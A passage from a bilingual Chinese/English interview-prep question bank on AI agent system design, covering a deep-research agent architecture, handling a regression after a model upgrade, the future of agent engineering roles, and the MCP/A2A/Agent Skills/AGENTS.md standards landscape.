> At a million conversations a day, that's about 12 per second on average and maybe 60 at peak, with roughly ten thousand concurrent sessions at peak by Little's law. Most traffic is a handful of intents, so I'd route with a small model and rules: FAQs go to retrieval over versioned policy docs, order lookups go to read-only tools called with the logged-in user's identity, and actions go into a controlled flow. The model drafts a plan, a policy engine in code checks amount, frequency and risk, the user confirms an impact summary, and a separate write service executes with an idempotency key and verifies the result. Anything rejected, unclear or emotional goes to a human with a summary. Cost is dominated by repeated input, so a stable cacheable prefix and small-model routing matter most. For peak events, I'd have multi-provider fallback and a degraded mode that pauses automated writes. The release gate is zero wrong actions on the eval set, plus pass^k on core intents.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| The refund call times out. Now what? | 视为"结果未知"而非失败；用同一个幂等键查询或重试；在查清前不告诉用户"已退款" | "That's outcome-unknown, not failure. Query or retry with the same idempotency key, and don't tell the user it's done until confirmed." |
| How do you keep latency low? | 意图路由用小模型；只读工具并行调用；流式输出；固定意图走工作流，少一轮 LLM 调用 | "Small-model routing, parallel read tools, streaming, and deterministic workflows for common intents to skip LLM turns." |

**坑**
- 一上来就画多 agent 架构。这个场景大部分流量是固定意图，工作流更合适。
- 规模估算只算 QPS，不算并发会话和 token，漏掉真正的成本大头。
- 退款上限写在 prompt 里。

**来源：** [Anthropic: Prompt caching 文档](https://platform.claude.com/docs/en/build-with-claude/prompt-caching)、[τ-bench (arXiv 2406.12045)](https://arxiv.org/abs/2406.12045)、[Anthropic: Building effective agents](https://www.anthropic.com/engineering/building-effective-agents)

---

### Q72 · 设计一个深度研究（Deep Research）Agent：用户给一个问题，Agent 自己检索几十上百个来源，输出带引用的长报告。 <a id="q72"></a> [↑ 目录](#toc)

**English question:** Design a Deep Research agent: given a question, it searches dozens to hundreds of sources on its own and produces a long, cited report.
（难度：实战 · 系统设计 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3](06-ai-system-design.md#s2-3) 讲了 agent 与工具调用（tool call）和编排（orchestration）层错误恢复；[06 主管-工人](06-ai-system-design.md#h24) 和 [06 生成-评审循环](06-ai-system-design.md#h28) 讲了这里要用的两种通信模式；[06 ⑥ 输出风险](06-ai-system-design.md#h37) 讲了引用（citation）校验（validation）。

**答案要点**

**1. 澄清问题**：报告多长、多久能交付（分钟级还是小时级）；来源是公开网页还是也包括内部文档；对引用精确度的要求（逐句引用还是逐段引用）。

**2. 组件与数据流（主管-工人加验证）**
```
User question
 -> Clarifier (optional: ask 1-3 scoping questions)
 -> Lead Agent (plan: sub-questions, budget, stop criteria) -- persists plan to Task Store
 -> Parallel Subagents (each: own context, search + fetch + read tools, budget N calls)
      each returns: findings[] with {claim, sourceUrl, quoteSpan, retrievedAt}
 -> Evidence Store (dedupe by URL/content hash, source quality score)
 -> Lead Agent: gap check -> spawn more subagents or stop
 -> Writer (outline -> sections, only from Evidence Store)
 -> Citation Verifier (each sentence: cited span exists and entails claim; else drop/repair)
 -> Report + source list
Durable execution: every step checkpointed; resume on crash
```

**3. 规模和成本（推算）**
- Anthropic 公开的数据：多 agent 研究系统的 token 消耗约是普通聊天的 15 倍，单 agent 约 4 倍。在他们的 BrowseComp 分析里，token 用量单独解释了 80% 的表现差异。
- 他们的分档：简单事实查询用 1 个 agent、3–10 次工具调用；对比类问题用 2–4 个子 agent、每个 10–15 次；复杂研究用 10 个以上子 agent。
- 一个复杂任务按 10 个子 agent × 15 次调用 × 平均每次 5k 输入 token 估算，约 75 万输入 token，加上主 agent 和写作阶段，量级是百万 token/任务（推算）。所以要按任务设预算（budget）上限，并显示给用户。
- 时长按分钟到几十分钟算，所以必须**异步（asynchronous）**：提交任务、显示进度、完成后通知。

**4. 关键取舍**
- **为什么用多 agent**：研究问题能拆成相互独立的子问题，适合并行（parallel）；每个子 agent 的上下文（context）独立，不会把主 agent 的上下文撑爆。Anthropic 报告并行能把复杂问题的研究时间最多缩短 90%。
- **代价**：子 agent 重复查同样的内容、主 agent 拆题不清楚。对策是计划里写明每个子 agent 的边界和输出格式，证据库按 URL 去重（deduplication）。
- **引用可信度（credibility）**：写作阶段**只能用证据库里的内容**；每句话的引用要校验——引用片段确实存在，并且能推出这句话（用 NLI 或 LLM 评委（judge））。校验不过就删掉这句或重新检索（retrieval）。
- **来源质量**：给来源打质量分（官方文档、论文 > 内容农场），冲突（conflict）的说法要并列呈现，不要硬选一个。
- **安全**：网页是不可信内容。子 agent 只有搜索和读取工具，没有任何写或外发能力，砍掉致命三要素中的出站（outbound）通道（Q66）。
- **持久执行（durable execution）**：长任务每一步做检查点（checkpoint），进程崩了能接着跑，不用从头重来。
- **评测**：用细则评分（事实准确、引用准确、覆盖度、来源质量、工具效率，这是 Anthropic 用的维度）；检索能力参考 BrowseComp（Q64）；再加人工抽查。

**English answer (speakable, ~45–75 s):**
> I'd build it as orchestrator-workers with a verification stage. A lead agent clarifies scope, writes a plan of independent sub-questions with budgets, and saves it to a task store. Subagents run in parallel, each with its own context and only search and read tools, and they return structured findings: claim, source URL, quoted span, and timestamp. Those go into an evidence store with deduplication and source-quality scores. The lead checks for gaps and either spawns more subagents or stops. A writer drafts the report only from the evidence store, and a citation verifier checks that each cited span exists and supports the sentence, dropping anything that fails. Anthropic reports multi-agent research uses about fifteen times the tokens of chat, so every task gets a budget, runs asynchronously with progress updates, and checkpoints every step so it can resume after a crash. I evaluate with a rubric covering factual accuracy, citation accuracy, completeness and source quality.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| Why not a single agent with a huge context? | 上下文越长，注意力越分散，成本也越高；并行子 agent 更快，每个上下文干净。但简单问题就该用单 agent，不要无脑多 agent | "Parallel subagents are faster and keep each context clean; but for simple questions I'd use a single agent, since multi-agent costs far more tokens." |
| How do you stop it from running forever? | 计划里写明停止条件（每个子问题都有足够的独立来源）；全局 token 和墙钟上限；到上限就基于已有证据出报告，并标明还有哪些缺口 | "Explicit stop criteria per sub-question, global token and time budgets, and on hitting the budget it writes up what it has and lists the gaps." |

**坑**
- 让写作模型凭记忆（memory）补充内容，引用只是事后贴上去的。
- 子 agent 的任务边界不清，三个子 agent 查同样的东西（这是 Q47 的实战题）。
- 同步（synchronous）阻塞地等几十分钟，没有进度展示和断点续跑。

**来源：** [Anthropic: How we built our multi-agent research system (2025-06-13)](https://www.anthropic.com/engineering/multi-agent-research-system)、[BrowseComp (arXiv 2504.12516)](https://arxiv.org/abs/2504.12516)

---

### Q73 · 线上 Agent 换了新版本模型后，任务成功率掉了 10 个点，你怎么排查和处理？ <a id="q73"></a> [↑ 目录](#toc)

**English question:** After switching your production agent to a new model version, task success dropped by 10 points. How do you investigate and handle it?
（难度：实战 · 题目后半句按截断前文补全）

**现有笔记：** [06 回归测试](06-ai-system-design.md#h31) 讲了组合回滚（模型、prompt、embedding 一起回到上一个好的组合）和配对比较；[06 §5.1](06-ai-system-design.md#s5-1) 的 "How would you handle model upgrades?" 一行；[06 §2.10](06-ai-system-design.md#s2-10)。

**答案要点**
1. **先止血（mitigation）。** 模型版本是锁定的配置（不用"latest"这类会自动漂移的别名），用开关把流量切回旧版本。
   - 如果旧版本已被厂商（vendor）下线：切到同档位的另一个已评测模型，或者把受影响的意图临时转人工。
   - 长任务不要中途换模型：已经在跑的会话用旧版本跑完，新会话再切（Anthropic 称为 rainbow deployment：新旧版本同时运行，流量逐步迁移）。
2. **定位：用冻结的评测集（eval set）重放（replay），按切片（slice）对比。**
   - 同一批题、同一份冻结的工具返回，新旧模型各跑 n 次，看配对差值，按意图和类别切片。
   - 通常是某几类任务掉得多，而不是全面下降。
3. **定位：比对 trace 的行为指标**，找出"怎么失败的"：
   - 工具调用：每任务调用次数、选错工具的比例、参数校验（argument validation）失败率、是否开始并行调用。
   - 输出：schema 或格式失败率、停止原因（`finish_reasons` 里 `length` 变多，说明输出被截断了）。
   - 行为：拒答率、追问用户的次数、凭记忆回答不调工具的比例。
   - 资源：token 用量和推理（reasoning）预算的变化。
4. **根因（root cause）：常见四类。**
   - ① **prompt 是针对旧模型调出来的**：新模型对指令更"字面"，或者对某些措辞的理解不同。
   - ② **工具描述（tool description）和格式的隐性依赖**：比如旧模型能容忍模糊的参数说明。
   - ③ **API 行为或默认参数变化**：输出长度上限、思考（thinking）参数、并行工具调用、停止序列。
   - ④ **评测集本身有问题**：新模型给出了不同但正确的答案，被过窄的评分规则判错。这种情况要人工复核失败样本，Q62 的教训就是这个。
5. **修复。**
   - 按切片修 prompt 和工具描述；必要时为不同模型维护不同的 prompt 版本。
   - 修好评分规则，按"结果"打分，而不是按"路径"打分。
   - 把这次发现的失败样本加入回归集（regression set）。
6. **上线指标。**
   - 新模型必须过离线门禁：每个切片都不劣于旧版，安全硬门禁为 0。
   - 然后上金丝雀，从 5% 逐步放量，盯任务成功率（success rate）、pass^k、转人工率、每任务成本和延迟（latency）。设好自动回滚条件。
   - 流程改进：厂商新模型一发布就提前跑评测，不要等旧模型下线才被迫切换。

**English answer (speakable, ~45–75 s):**
> First, roll back: the model version is pinned config behind a flag, so I shift traffic back, keeping in-flight long tasks on the old version. Then I replay the frozen eval set on both models with repeated runs and compare paired results by slice, because a 10-point drop is usually a few categories collapsing, not everything. In traces I compare behavior: tool-call counts, wrong-tool and argument-validation rates, schema failures, finish reasons like hitting the length limit, refusals, and answering without tools. Typical root causes are prompts tuned to the old model's quirks, tool descriptions the old model tolerated, changed API defaults like output limits or thinking settings, or an eval that rejects valid new behavior, so I manually review failing cases before blaming the model. I fix prompts and tool descriptions per slice, fix the graders, add the cases to the regression set, and re-release through a canary with auto-rollback.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| The old model is being deprecated next month. Can't roll back. | 先把受影响的切片转人工或换成同档位的另一个模型；集中修 prompt；以后在新模型发布当天就跑评测，留出迁移窗口 | "Route the affected slices to humans or another evaluated model, fix prompts in a focused sprint, and evaluate new models on release day next time." |
| Would you keep separate prompts per model? | 会，作为短期方案：prompt 和模型版本一起版本化；长期目标是让 prompt 更简单、少依赖特定模型的怪癖 | "Short term, yes, versioned together with the model. Long term I simplify prompts so they depend less on model quirks." |

**坑**
- 用"latest"之类的别名，导致模型被厂商静默升级，出了问题都不知道是哪天变的。
- 一上来就改 prompt，不先回滚，也没按切片定位。
- 不复核失败样本，直接下结论"新模型更差"。有可能是评分规则错判了正确答案。

**来源：** [Anthropic: How we built our multi-agent research system（rainbow deployment）](https://www.anthropic.com/engineering/multi-agent-research-system)、[Anthropic: Demystifying evals for AI agents](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)、[OTel inference span（finish_reasons 等字段）](https://github.com/open-telemetry/semantic-conventions-genai/blob/main/docs/gen-ai/client-inference.md)

---

### Q74 · 你怎么看"Agent 开发工程师"这个岗位在模型能力持续提升之后的前景？会不会被模型本身取代？ <a id="q74"></a> [↑ 目录](#toc)

**English question:** How do you see the future of the "agent engineer" role as models keep improving? Will the role be absorbed by the models themselves?
（难度：开放 · 题目后半句按截断前文补全）

**现有笔记：** 无，本题新补。"该不该用 LLM"的判断见 [06 §2.1](06-ai-system-design.md#s2-1)。

**答案要点**

**我的观点：岗位不会消失，但重心会从"写脚手架"转到"系统工程"。会被取代的是 prompt 技巧和框架胶水代码，留下的是评测、工具接口、权限（permission）和可靠性。**

1. **会被模型吸收的部分。**
   - 复杂的提示技巧、手写的多步推理链、为弥补模型弱点而写的重试（retry）逻辑。
   - 模型变强以后，这些都会变得多余。Anthropic 的建议也是先用最简单的方案，只在确实需要时才增加复杂度。
2. **不会被吸收的部分。** 这些是系统属性，不是模型能力：
   - **评测**：定义什么叫"做对了"、构建私有评测集、做发布门禁。模型再强也不知道你的业务标准（Q60–Q62）。
   - **工具和接口设计**：领域工具的契约、错误语义、分页、结果大小预算。
   - **权限和安全**：模型越强、越自主，越需要服务端强制的边界（Q66–Q70）。
   - **可靠性和成本**：持久执行、观测（observability）、缓存、路由。
3. **会变得更重要的部分。** 模型能力越强，交给它的任务越长、越有后果，出错的代价就越大。Gaia2 和 OSWorld 2.0 这类长程任务上，模型的完整完成率还很低（Q64）。
4. **对自己的定位。** 后端出身的优势正好在这里：分布式系统、幂等（idempotency）、权限、可观测性（observability）。Agent 工程本质上是"不确定组件参与的分布式系统工程"。

**English answer (speakable, ~45–75 s):**
> I think the role survives, but its center of gravity moves. The parts that get absorbed are prompt tricks, hand-built reasoning chains, and glue code that compensates for model weaknesses; every model generation makes some of that scaffolding unnecessary, which is why I start with the simplest design. What doesn't get absorbed are system properties: defining what "correct" means for this business and building private evals and release gates; designing tool contracts with clear errors and size budgets; enforcing permissions and safety on the server; and making long-running work reliable, observable and affordable. In fact, stronger models get handed longer and more consequential tasks, so the cost of a mistake goes up. I see agent engineering as distributed systems engineering with a non-deterministic component in the loop, which is exactly where a backend background helps.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| What skill would you invest in next? | 评测设计和统计（配对比较、置信区间、评委校准），还有 agent 安全架构 | "Eval design and the statistics behind it, plus security architecture for agents." |
| Isn't eval also automatable by models? | 打分的执行可以交给模型，但"什么算对"由业务决定，评委也需要人工校准 | "Models can execute grading, but deciding what counts as correct is a business decision, and judges still need human calibration." |

**坑**
- 回答得过于悲观（"会被取代"）或空泛乐观（"永远需要人"），没有说清楚哪部分会变、哪部分不会。
- 拿框架熟练度当核心竞争力，框架迭代很快。

**来源：** [Anthropic: Building effective agents](https://www.anthropic.com/engineering/building-effective-agents)、[OSWorld 2.0 项目页](https://osworld-v2.xlang.ai/)、[Hugging Face: Gaia2 and ARE](https://huggingface.co/blog/gaia2)

---

### Q75 · 你怎么看 MCP、A2A、Agent Skills、AGENTS.md 这一批 Agent 标准？它们会怎么演进？ <a id="q75"></a> [↑ 目录](#toc)

**English question:** What is your view of the current wave of agent standards — MCP, A2A, Agent Skills, AGENTS.md — and how will they evolve?
（难度：开放 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.3](06-ai-system-design.md#s2-3) 讲了 MCP 现状和工具调用；[06 点对点消息（A2A）](06-ai-system-design.md#h27)；MCP 无状态（stateless）改版见本题库 Q17，A2A 见 Q16，Skills 见 Q55。

**答案要点**

**我的观点：这几个标准处在不同层，是互补关系，不是竞争关系。它们正在向同一个中立治理机构（Linux Foundation 旗下的 AAIF）集中。接下来两年的主题是"安全和运维成熟度"，而不是再出新协议（protocol）。**

1. **分层。**
   - **MCP**：agent 连接**工具和数据**（agent → 工具）。
   - **A2A**：agent 和**另一个 agent** 协作，两边互相不知道对方内部实现（agent ↔ agent）。
   - **Agent Skills**：把**流程性知识**打包成文件夹（说明、脚本、资源），按需加载。
   - **AGENTS.md**：仓库（repository）里给 coding agent 看的**项目说明**（怎么构建、怎么测试、有什么约定）。
2. **治理已在集中（已核实）。**
   - AAIF 在 2025-12-09 成立，创始项目是 MCP、goose、AGENTS.md。
   - A2A 在 2025-06-23 进入 Linux Foundation，后来成为 AAIF 托管（hosted）项目。
   - 2026-10-22 AAIF 新增 Agent Skills、Open Responses、OpenEnv、OpenSandbox，目前共托管 10 个项目。
   - 中立治理降低了"绑死在一家厂商"的风险，企业更敢采用。
3. **演进方向（我的判断）。**
   - ① **无状态、好运维**：例如 MCP 2026-07-28 去掉会话握手（Q17），方便水平扩展（horizontal scaling）和网关（gateway）路由。
   - ② **身份和授权（authorization）**成为重点：代表用户调用、细粒度授权、工具签名（signature）和来源证明。这正对应 OWASP 的 ASI03、ASI04（Q67）。
   - ③ **可观测性标准化**：OTel 已经有 MCP 和 A2A 的语义约定文档（Q63）。
   - ④ **合并重叠的部分**：比如 Skills 和 MCP 的边界——Skills 管"怎么做"，MCP 管"连什么"。
4. **风险。** 规范改得太快，SDK 跟不上；把协议当成安全边界（MCP 本身不是安全边界，见 [06 §5.1](06-ai-system-design.md#s5-1)）；供应链投毒（tool poisoning，Q18）。
5. **工程上的建议。** 在业务代码和协议之间加一层薄适配，锁定规范和 SDK 版本，安全控制放在网关和 server 端，不依赖协议本身。

**English answer (speakable, ~45–75 s):**
> I see them as layers, not competitors. MCP connects an agent to tools and data; A2A lets opaque agents collaborate; Agent Skills package procedural know-how that loads on demand; AGENTS.md tells coding agents how a repo works. What's notable is governance converging: the Linux Foundation's Agentic AI Foundation launched in December 2025 with MCP, goose and AGENTS.md, A2A moved under it, and Agent Skills joined in October 2026. That neutrality makes enterprises more willing to adopt. Over the next couple of years I expect less new protocol invention and more operational maturity: stateless designs that scale behind normal load balancers, like MCP's 2026 revision, plus identity and authorization, tool provenance, and standard telemetry. The risk is spec churn and people treating a protocol as a security boundary. So I keep a thin adapter layer, pin versions, and enforce security in the gateway and servers.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| Would you build on A2A today? | 只有跨团队或跨组织、双方互不了解内部实现的 agent 协作才需要；同一个系统内部用函数调用或 MCP 就够了 | "Only for cross-team or cross-org agents that are opaque to each other; inside one system, plain calls or MCP are enough." |
| Skills vs MCP — when which? | 需要连接外部系统、访问实时数据就用 MCP；需要教 agent 一套做事的流程和规范就用 Skills；两者常常一起用 | "MCP when I need live access to an external system; Skills when I'm teaching a procedure. They're often combined." |

**坑**
- 说"A2A 和 MCP 是竞争关系"或"Skills 会取代 MCP"。
- 治理时间线说错，比如说 A2A 一开始就在 AAIF。它是 2025-06 先进 Linux Foundation，后来才成为 AAIF 托管项目。
- 把 AGENTS.md 说成协议。它只是一个约定格式的 Markdown 文件。

**来源：** [Linux Foundation: Formation of the Agentic AI Foundation (2025-12-09)](https://www.linuxfoundation.org/press/linux-foundation-announces-the-formation-of-the-agentic-ai-foundation)、[Linux Foundation: Agent2Agent Protocol Project (2025-06-23)](https://www.linuxfoundation.org/press/linux-foundation-launches-the-agent2agent-protocol-project-to-enable-secure-intelligent-communication-between-ai-agents)、[AAIF: Four New Projects incl. Agent Skills (2026-10-22)](https://www.linuxfoundation.org/press/agentic-ai-foundation-announces-four-new-projects-agent-skills-open-responses-openenv-and-opensandbox)、[OTel GenAI 语义约定仓库（含 mcp.md、a2a.md）](https://github.com/open-telemetry/semantic-conventions-genai)
